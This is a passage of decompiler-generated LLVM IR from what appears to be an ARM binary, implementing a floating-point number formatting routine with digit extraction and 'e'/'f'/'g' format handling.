  %v2_19c14 = icmp eq i32 %v0_19be0, 0
  br label %dec_label_pc_19c04

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19c9c.dec_label_pc_19c04_crit_edge, %bb212
  %v2_19c0c = phi i32 [ add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34432), %bb212 ], [ %v2_19c0c.pre, %dec_label_pc_19c9c.dec_label_pc_19c04_crit_edge ]
  %v0_19c08 = phi i32 [ 9, %bb212 ], [ %v0_19c9c, %dec_label_pc_19c9c.dec_label_pc_19c04_crit_edge ]
  %v2_19c4c = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_19c9c.dec_label_pc_19c04_crit_edge ]
  store i32 %v0_19be0, i32* %r2.global-to-local, align 4
  %v1_19c08 = add i32 %v0_19c08, -1
  store i32 %v1_19c08, i32* %sl.global-to-local, align 4
  store i32 %v2_19c0c, i32* @lr, align 4
  %v3_19c10 = mul i32 %v1_19c08, 8
  store i32 %v3_19c10, i32* %r3.global-to-local, align 4
  store i1 %v2_19c14, i1* %cpsr_z.global-to-local, align 1
  %v0_19c18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19c18, i32* %r0.global-to-local, align 4
  %v0_19c1c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19c1c, i32* %r1.global-to-local, align 4
  %v2_19c20 = add i32 %v3_19c10, %v2_19c0c
  store i32 %v2_19c20, i32* %ip.global-to-local, align 4
  %v1_19c5c = inttoptr i32 %v2_19c20 to i32*
  %v2_19c5c = load i32, i32* %v1_19c5c, align 4
  %v3_19c5c = sext i32 %v2_19c5c to i64
  %v1_19c60 = sext i32 %v0_19c18 to i64
  %v2_19c60 = bitcast i64 %v1_19c60 to double
  br i1 %v2_19c14, label %dec_label_pc_19c5c, label %dec_label_pc_19c28

dec_label_pc_19c28:                               ; preds = %dec_label_pc_19c04
  %v8_19c2c = bitcast i64 %v3_19c5c to double
  %v9_19c2c = fmul double %v2_19c60, %v8_19c2c
  %v10_19c2c = fptrunc double %v9_19c2c to float
  %v11_19c2c = bitcast float %v10_19c2c to i32
  store i32 %v11_19c2c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_19c2c, i32* %r7.global-to-local, align 4
  store i32 %v0_19c1c, i32* %r8.global-to-local, align 4
  %v4_19c40 = call i32 @__aeabi_dcmplt(i32 %v11_19c2c, i32 %v0_19c1c, i32 0, i32 1104006501)
  store i32 %v4_19c40, i32* %r0.global-to-local, align 4
  %v2_19c44 = icmp eq i32 %v4_19c40, 0
  store i1 %v2_19c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c44, label %dec_label_pc_19c9c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_19c28
  %v1_19c4c = load i32, i32* %r4.global-to-local, align 4
  %v3_19c4c = sub i32 %v2_19c4c, %v1_19c4c
  store i32 %v3_19c4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19c94

dec_label_pc_19c5c:                               ; preds = %dec_label_pc_19c04
  store i32 %v0_19c1c, i32* @r1, align 4
  %v8_19c68 = bitcast i64 %v3_19c5c to double
  %v9_19c68 = fdiv double %v2_19c60, %v8_19c68
  %v10_19c68 = fptrunc double %v9_19c68 to float
  %v11_19c68 = bitcast float %v10_19c68 to i32
  store i32 %v11_19c68, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_19c68, i32* %r7.global-to-local, align 4
  store i32 %v0_19c1c, i32* %r8.global-to-local, align 4
  %v4_19c7c = call i32 @__aeabi_dcmpge(i32 %v11_19c68, i32 %v0_19c1c, i32 0, i32 1100470148)
  store i32 %v4_19c7c, i32* %r0.global-to-local, align 4
  %v2_19c80 = icmp eq i32 %v4_19c7c, 0
  store i1 %v2_19c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c80, label %dec_label_pc_19c9c, label %dec_label_pc_19c88

dec_label_pc_19c88:                               ; preds = %dec_label_pc_19c5c
  %v1_19c8c = load i32, i32* %r4.global-to-local, align 4
  %v2_19c8c = add i32 %v1_19c8c, %v2_19c4c
  store i32 %v2_19c8c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19c94

dec_label_pc_19c94:                               ; preds = %.thread10, %dec_label_pc_19c88
  %stack_var_-192.2 = phi i32 [ %v2_19c8c, %dec_label_pc_19c88 ], [ %v3_19c4c, %.thread10 ]
  %v0_19c94 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_19c94, i32* %r5.global-to-local, align 4
  %v0_19c98 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_19c98, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19c9c

dec_label_pc_19c9c:                               ; preds = %dec_label_pc_19c28, %dec_label_pc_19c5c, %dec_label_pc_19c94
  %stack_var_-192.3 = phi i32 [ %v2_19c4c, %dec_label_pc_19c5c ], [ %stack_var_-192.2, %dec_label_pc_19c94 ], [ %v2_19c4c, %dec_label_pc_19c28 ]
  %v0_19c9c = load i32, i32* %sl.global-to-local, align 4
  %v2_19c9c = icmp eq i32 %v0_19c9c, 0
  store i1 %v2_19c9c, i1* %cpsr_z.global-to-local, align 1
  %v0_19ca0 = load i32, i32* %r4.global-to-local, align 4
  %v3_19ca0 = sdiv i32 %v0_19ca0, 2
  store i32 %v3_19ca0, i32* %r4.global-to-local, align 4
  br i1 %v2_19c9c, label %dec_label_pc_19ca8, label %dec_label_pc_19c9c.dec_label_pc_19c04_crit_edge

dec_label_pc_19c9c.dec_label_pc_19c04_crit_edge:  ; preds = %dec_label_pc_19c9c
  %v2_19c0c.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_19c04

dec_label_pc_19ca8:                               ; preds = %dec_label_pc_19c9c
  %v0_19ca8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19ca8, i32* @r0, align 4
  %v0_19cac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19cac, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_19cb8 = call i32 @__aeabi_dcmpge(i32 %v0_19ca8, i32 %v0_19cac, i32 0, i32 1104006501)
  store i32 %v6_19cb8, i32* %r0.global-to-local, align 4
  %v2_19cbc = icmp eq i32 %v6_19cb8, 0
  store i1 %v2_19cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19cbc, label %dec_label_pc_19cec, label %dec_label_pc_19cc4

dec_label_pc_19cc4:                               ; preds = %dec_label_pc_19ca8
  %v0_19cc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_19cc4 = sext i32 %v0_19cc4 to i64
  %v2_19cc4 = bitcast i64 %v1_19cc4 to double
  %v0_19cc8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19cc8, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_19cd4 = fdiv double %v2_19cc4, 0.000000e+00
  %v10_19cd4 = fptrunc double %v9_19cd4 to float
  %v11_19cd4 = bitcast float %v10_19cd4 to i32
  store i32 %v11_19cd4, i32* %r0.global-to-local, align 4
  store i32 %v11_19cd4, i32* %r5.global-to-local, align 4
  %v1_19ce4 = add i32 %stack_var_-192.3, 1
  store i32 %v1_19ce4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19cec

dec_label_pc_19cec:                               ; preds = %dec_label_pc_19cc4, %bb208, %dec_label_pc_19ca8, %dec_label_pc_19b0c
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_19ca8 ], [ -1, %dec_label_pc_19b0c ], [ -1, %bb208 ], [ %v1_19ce4, %dec_label_pc_19cc4 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_19cf0 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_19cf0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19cf4

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19d6c, %dec_label_pc_19cec
  %v0_19cf4 = load i32, i32* %r6.global-to-local, align 4
  %v0_19cf8 = load i32, i32* %r5.global-to-local, align 4
  %v1_19cfc = sext i32 %v0_19cf8 to i64
  %v2_19cfc = bitcast i64 %v1_19cfc to double
  %v3_19cfc = fptoui double %v2_19cfc to i32
  store i32 %v3_19cfc, i32* %r8.global-to-local, align 4
  store i32 %v3_19cfc, i32* %r2.global-to-local, align 4
  store i32 %v0_19cf4, i32* %r3.global-to-local, align 4
  store i32 %v0_19cf8, i32* @r0, align 4
  store i32 %v0_19cf4, i32* %r1.global-to-local, align 4
  %v6_19d18 = call i32 @__aeabi_dsub(i32 %v0_19cf8, i32 %v0_19cf4, i32 %v3_19cfc, i32 %v0_19cf4)
  %v7_19d18 = sext i32 %v6_19d18 to i64
  %v8_19d18 = bitcast i64 %v7_19d18 to double
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v9_19d24 = fmul double %v8_19d18, 0.000000e+00
  %v10_19d24 = fptrunc double %v9_19d24 to float
  %v11_19d24 = bitcast float %v10_19d24 to i32
  store i32 %v11_19d24, i32* %r0.global-to-local, align 4
  %v0_19d28 = load i32, i32* %sl.global-to-local, align 4
  %v1_19d28 = add i32 %v0_19d28, 9
  store i32 %v1_19d28, i32* %sl.global-to-local, align 4
  store i32 %v11_19d24, i32* %r5.global-to-local, align 4
  store i32 %v0_19cf4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_19d38.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d38:                               ; preds = %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge, %dec_label_pc_19cf4
  %v1_19d4c = phi i32 [ %v1_19d4c.pre, %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge ], [ %v1_19d28, %dec_label_pc_19cf4 ]
  %v0_19d44 = phi i32 [ %v0_19d60, %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge ], [ 0, %dec_label_pc_19cf4 ]
  %v0_19d50 = phi i32 [ %v2_19d5c, %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge ], [ %v0_19d38.pre, %dec_label_pc_19cf4 ]
  %v3_19d40 = urem i32 %v0_19d50, 10
  %v1_19d44 = add i32 %v0_19d44, 1
  store i32 %v1_19d44, i32* %r7.global-to-local, align 4
  %v1_19d48 = or i32 %v3_19d40, 48
  store i32 %v1_19d48, i32* %r2.global-to-local, align 4
  %v2_19d4c = sub i32 %v1_19d4c, %v1_19d44
  store i32 %v2_19d4c, i32* %r3.global-to-local, align 4
  store i32 %v0_19d50, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19d58 = trunc i32 %v1_19d48 to i8
  %v3_19d58 = inttoptr i32 %v2_19d4c to i8*
  store i8 %v1_19d58, i8* %v3_19d58, align 1
  %v0_19d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_19d5c = load i32, i32* %r1.global-to-local, align 4
  %v2_19d5c = udiv i32 %v0_19d5c, %v1_19d5c
  store i32 %v2_19d5c, i32* %r0.global-to-local, align 4
  %v0_19d60 = load i32, i32* %r7.global-to-local, align 4
  %v7_19d60 = icmp eq i32 %v0_19d60, 8
  store i1 %v7_19d60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_19d5c, i32* %r8.global-to-local, align 4
  %v7_19d68 = icmp slt i32 %v0_19d60, 9
  br i1 %v7_19d68, label %dec_label_pc_19d38.dec_label_pc_19d38_crit_edge, label %dec_label_pc_19d6c

dec_label_pc_19d38.dec_label_pc_19d38_crit_edge:  ; preds = %dec_label_pc_19d38
  %v1_19d4c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d6c:                               ; preds = %dec_label_pc_19d38
  %v0_19d6c = load i32, i32* %r4.global-to-local, align 4
  %v1_19d6c = add i32 %v0_19d6c, 1
  store i32 %v1_19d6c, i32* %r4.global-to-local, align 4
  %v7_19d70 = icmp eq i32 %v0_19d6c, 0
  store i1 %v7_19d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19d70, label %dec_label_pc_19cf4, label %dec_label_pc_19d78

dec_label_pc_19d78:                               ; preds = %dec_label_pc_19d6c
  %v0_19d78 = load i32, i32* %sb.global-to-local, align 4
  %v7_19d78 = icmp eq i32 %v0_19d78, 96
  store i1 %v7_19d78, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_19d78, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_19d78
  %v5_19d88 = add i32 %v0_19d78, 32
  store i32 %v5_19d88, i32* %r3.global-to-local, align 4
  %v5_19d8c = urem i32 %v5_19d88, 256
  store i32 %v5_19d8c, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_19d78
  %v4_19d84.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_19d84.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_19d84126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_19dac = phi i32 [ %v0_19d78, %thread-pre-split ], [ %v5_19d8c, %bb213 ]
  %v7_19d90 = icmp eq i32 %v0_19dac, 103
  %. = zext i1 %v7_19d90 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_19d9c = load i32, i32* %fp.global-to-local, align 4
  %v2_19d9c = icmp eq i32 %v0_19d9c, 0
  store i1 %v2_19d9c, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_19d9c, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_19da4 = icmp eq i1 %v7_19d90, false
  store i1 %v2_19da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19da4, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_19da8 = add i32 %v0_19d9c, -1
  store i32 %v2_19da8, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_19dbc = phi i32 [ %v0_19d9c, %.thread16 ], [ %v0_19d9c, %bb218 ], [ %v2_19da8, %bb219 ]
  %v7_19dac = icmp eq i32 %v0_19dac, 102
  store i1 %v7_19dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19dac, label %dec_label_pc_19db8, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_19dbc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19de0

dec_label_pc_19db8:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_19dbc = add i32 %v0_19dbc, %stack_var_-192.4
  store i32 %v2_19dbc, i32* %ip.global-to-local, align 4
  %v8_19dc0 = icmp eq i32 %v2_19dbc, -1
  store i1 %v8_19dc0, i1* %cpsr_z.global-to-local, align 1
  %v6_19dc4 = icmp slt i32 %v2_19dbc, -1
  br i1 %v6_19dc4, label %dec_label_pc_19dc8, label %dec_label_pc_19de0

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19db8
  %v2_19dc8 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_19dc8, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_19dd4 = bitcast i32* %stack_var_-83 to i8*
  %v3_19dd4 = call i32 @__GI_memset(i8* %v2_19dd4, i32 48)
  store i32 %v3_19dd4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19de0

dec_label_pc_19de0:                               ; preds = %bb221, %dec_label_pc_19db8, %dec_label_pc_19dc8
  %v1_19e2492 = phi i32 [ %v3_19dd4, %dec_label_pc_19dc8 ], [ %v2_19d5c, %dec_label_pc_19db8 ], [ %v2_19d5c, %bb221 ]
  %v1_19e08 = phi i32 [ -1, %dec_label_pc_19dc8 ], [ %v2_19dbc, %dec_label_pc_19db8 ], [ %v0_19dbc, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_19dc8 ], [ %stack_var_-192.4, %dec_label_pc_19db8 ], [ %stack_var_-192.4, %bb221 ]
  %v1_19de4 = add i32 %v1_19e08, -16
  %v3_19de4 = sub i32 15, %v1_19e08
  %v4_19de4 = and i32 %v3_19de4, %v1_19e08
  %v5_19de4 = icmp slt i32 %v4_19de4, 0
  %v6_19de4 = icmp slt i32 %v1_19de4, 0
  %v7_19de4 = icmp eq i32 %v1_19e08, 16
  store i1 %v7_19de4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_19df0 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_19df0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_19df8 = xor i1 %v6_19de4, %v5_19de4
  %v4_19df8 = or i1 %v7_19de4, %v3_19df8
  br i1 %v4_19df8, label %dec_label_pc_19e04, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_19de0
  %v7_19df8137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_19df8137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_19e04:                               ; preds = %dec_label_pc_19de0
  %v2_19e04 = ptrtoint i32* %stack_var_-82 to i32
  %v2_19e08 = add i32 %v1_19e08, %v2_19e04
  store i32 %v2_19e08, i32* %r3.global-to-local, align 4
  %v1_19e0c = add i32 %v2_19e08, 2
  %v2_19e0c = inttoptr i32 %v1_19e0c to i8*
  %v3_19e0c = load i8, i8* %v2_19e0c, align 1
  %v4_19e0c = zext i8 %v3_19e0c to i32
  store i32 %v4_19e0c, i32* %r2.global-to-local, align 4
  store i32 %v1_19e0c, i32* %r1.global-to-local, align 4
  %v2_19e14 = icmp ugt i8 %v3_19e0c, 51
  %v7_19e14 = icmp eq i8 %v3_19e0c, 52
  store i1 %v7_19e14, i1* %cpsr_z.global-to-local, align 1
  %v2_19e18 = xor i1 %v2_19e14, true
  %v3_19e18 = or i1 %v7_19e14, %v2_19e18
  br i1 %v3_19e18, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_19e04
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_19e04, %bb222
  %v1_19e2490 = phi i32 [ %v1_19e2492, %dec_label_pc_19e04 ], [ 0, %bb222 ]
  %v2_19e1c = xor i1 %v7_19e14, true
  %v3_19e1c = and i1 %v2_19e14, %v2_19e1c
  br i1 %v3_19e1c, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_19e20 = phi i32 [ %v0_19e20.pre, %._crit_edge87 ], [ %v7_19df8137141, %.thread140 ], [ %v1_19e0c, %bb223 ], [ %v1_19e0c, %bb224 ]
  %v1_19e24 = phi i32 [ %v1_19e24.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_19e2490, %bb223 ], [ 1, %bb224 ]
  %v1_19e20 = add i32 %v0_19e20, -1
  %v2_19e20 = inttoptr i32 %v1_19e20 to i8*
  %v3_19e20 = load i8, i8* %v2_19e20, align 1
  %v4_19e20 = zext i8 %v3_19e20 to i32
  store i32 %v1_19e20, i32* %r1.global-to-local, align 4
  %v2_19e24 = add i32 %v4_19e20, %v1_19e24
  %v1_19e28 = urem i32 %v2_19e24, 256
  store i32 %v1_19e28, i32* %r3.global-to-local, align 4
  %v2_19e2c = icmp ugt i32 %v1_19e28, 56
  %v7_19e2c = icmp eq i32 %v1_19e28, 57
  store i1 %v7_19e2c, i1* %cpsr_z.global-to-local, align 1
  %v2_19e30 = xor i1 %v2_19e2c, true
  %v3_19e30 = or i1 %v7_19e2c, %v2_19e30
  br i1 %v3_19e30, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_19e34 = xor i1 %v7_19e2c, true
  %v3_19e34 = and i1 %v2_19e2c, %v2_19e34
  br i1 %v3_19e34, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_19e3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_19e3c = phi i32 [ %v1_19e3c.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_19e38 = icmp eq i32 %v1_19e28, 48
  store i1 %v7_19e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19e38, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_19e3c = or i32 %v1_19e3c, 1
  store i32 %v2_19e3c, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_19e40 = phi i32 [ 1, %bb229 ], [ %v1_19e3c, %bb228 ]
  %v2_19e40 = icmp eq i32 %v0_19e40, 0
  store i1 %v2_19e40, i1* %cpsr_z.global-to-local, align 1
  %v1_19e44 = trunc i32 %v2_19e24 to i8
  store i8 %v1_19e44, i8* %v2_19e20, align 1
  %v0_19e48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19e48, label %dec_label_pc_19e4c, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_19e24.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_19e20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_19e4c:                               ; preds = %._crit_edge93
  store i32 %v2_19df0, i32* %r2.global-to-local, align 4
  %v2_19e50 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_19e50, i32* %r3.global-to-local, align 4
  %v0_19e54 = load i32, i32* %r1.global-to-local, align 4
  %v3_19e54 = icmp uge i32 %v0_19e54, %v2_19e50
  %v9_19e54 = icmp eq i32 %v0_19e54, %v2_19e50
  store i1 %v9_19e54, i1* %cpsr_z.global-to-local, align 1
  %v2_19e58 = xor i1 %v3_19e54, true
  %v3_19e58 = or i1 %v9_19e54, %v2_19e58
  br i1 %v3_19e58, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_19e4c
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_19e50, i32* %r2.global-to-local, align 4
  store i32 %v2_19e50, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_19e4c, %bb230
  %v2_19e78 = phi i32 [ %v2_19e50, %bb230 ], [ %v0_19e54, %dec_label_pc_19e4c ]
  %v4_19e6c144 = phi i32 [ %v2_19e50, %bb230 ], [ %v2_19df0, %dec_label_pc_19e4c ]
  %v2_19e64 = xor i1 %v9_19e54, true
  %v3_19e64 = and i1 %v3_19e54, %v2_19e64
  br i1 %v3_19e64, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_19e58, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_19e68 = load i32, i32* @lr, align 4
  %v5_19e68 = add i32 %v4_19e68, 1
  store i32 %v5_19e68, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_19e64, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_19e6c = add i32 %v4_19e6c144, 2
  store i32 %v5_19e6c, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19e74 = load i32, i32* %sb.global-to-local, align 4
  %v7_19e74 = icmp eq i32 %v0_19e74, 103
  store i1 %v7_19e74, i1* %cpsr_z.global-to-local, align 1
  %v3_19e78 = add i32 %v2_19e78, 1
  %v4_19e78 = inttoptr i32 %v3_19e78 to i8*
  store i8 0, i8* %v4_19e78, align 1
  %v0_19e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_19e7c = add i32 %v0_19e7c, 1
  store i32 %v1_19e7c, i32* %lr.global-to-local, align 4
  %v0_19e80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19e80, label %dec_label_pc_19e84, label %dec_label_pc_19eac

dec_label_pc_19e84:                               ; preds = %bb236
  %v0_19e84 = load i32, i32* %r0.global-to-local, align 4
  %v1_19e84 = load i32, i32* %ip.global-to-local, align 4
  %v2_19e84 = sub i32 %v0_19e84, %v1_19e84
  %v4_19e84 = xor i32 %v1_19e84, %v0_19e84
  %v5_19e84 = xor i32 %v2_19e84, %v0_19e84
  %v6_19e84 = and i32 %v5_19e84, %v4_19e84
  %v7_19e84 = icmp slt i32 %v6_19e84, 0
  %v8_19e84 = icmp slt i32 %v2_19e84, 0
  %v9_19e84 = icmp eq i32 %v0_19e84, %v1_19e84
  %v3_19e88 = xor i1 %v8_19e84, %v7_19e84
  %v4_19e88 = or i1 %v9_19e84, %v3_19e88
  %.258 = zext i1 %v4_19e88 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_19e90 = add i32 %v0_19e84, 4
  %v3_19e90 = sub i32 0, %v0_19e84
  %v4_19e90 = and i32 %v1_19e90, %v3_19e90
  %v5_19e90 = icmp slt i32 %v4_19e90, 0
  %v6_19e90 = icmp slt i32 %v1_19e90, 0
  %v7_19e90 = icmp eq i32 %v1_19e90, 0
  store i1 %v7_19e90, i1* %cpsr_z.global-to-local, align 1
  %v2_19e94 = xor i1 %v6_19e90, %v5_19e90
  br i1 %v2_19e94, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_19e84
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a1c8

bb239:                                            ; preds = %dec_label_pc_19e84
  %v2_19e98 = icmp eq i1 %v4_19e88, false
  store i1 %v2_19e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19e98, label %dec_label_pc_1a1c8, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_19e9c = sub i32 %v1_19e84, %v0_19e84
  store i32 %v3_19e9c, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19eb8

dec_label_pc_19eac:                               ; preds = %bb236
  %v0_19eac = load i32, i32* %sb.global-to-local, align 4
  %v7_19eac = icmp eq i32 %v0_19eac, 102
  store i1 %v7_19eac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_19eac, i32* %r8.global-to-local, align 4
  br i1 %v7_19eac, label %dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge, label %dec_label_pc_19ec8

dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge:  ; preds = %dec_label_pc_19eac
  %v0_19eb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19eb8

dec_label_pc_19eb8:                               ; preds = %.thread24, %dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge
  %v0_19eb8 = phi i32 [ %v0_19eb8.pre, %dec_label_pc_19eac.dec_label_pc_19eb8_crit_edge ], [ %v0_19e84, %.thread24 ]
  %v1_19eb8 = icmp slt i32 %v0_19eb8, 0
  %v2_19eb8 = icmp eq i32 %v0_19eb8, 0
  store i1 %v2_19eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19eb8, label %bb240, label %dec_label_pc_19ec8

bb240:                                            ; preds = %dec_label_pc_19eb8
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_19ec0 = load i32, i32* %r2.global-to-local, align 4
  %v6_19ec0 = add i32 %v5_19ec0, -1
  %v7_19ec0 = inttoptr i32 %v6_19ec0 to i8*
  store i8 48, i8* %v7_19ec0, align 1
  %v8_19ec0 = load i32, i32* %r2.global-to-local, align 4
  %v9_19ec0 = add i32 %v8_19ec0, -1
  store i32 %v9_19ec0, i32* %r2.global-to-local, align 4
  %v0_19ec4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_19ef8.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_19ec8

dec_label_pc_19ec8:                               ; preds = %bb240, %dec_label_pc_19eb8, %dec_label_pc_1a1c8, %dec_label_pc_19eac
  %v1_19ef8 = phi i32 [ %v1_19e7c, %dec_label_pc_19eac ], [ %v1_19e7c, %dec_label_pc_1a1c8 ], [ %v1_19ef8.pre.pre, %bb240 ], [ %v1_19e7c, %dec_label_pc_19eb8 ]
  %v1_19f7030 = phi i32 [ 0, %dec_label_pc_19eac ], [ 0, %dec_label_pc_1a1c8 ], [ %v0_19ec4.pre, %bb240 ], [ %v0_19eb8, %dec_label_pc_19eb8 ]
  store i32 %v1_19f7030, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_19ed4 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_19ed4, i32* %r3.global-to-local, align 4
